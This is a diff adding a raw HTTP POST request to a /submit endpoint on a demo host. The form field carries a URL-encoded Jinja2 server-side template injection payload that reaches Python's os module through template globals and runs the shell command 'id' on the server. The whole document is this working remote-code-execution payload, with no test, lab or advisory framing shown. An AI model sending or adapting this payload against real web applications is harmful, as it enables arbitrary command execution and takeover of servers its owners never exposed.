@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Connection: close
+
+name=%7B%7Bnamespace.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D
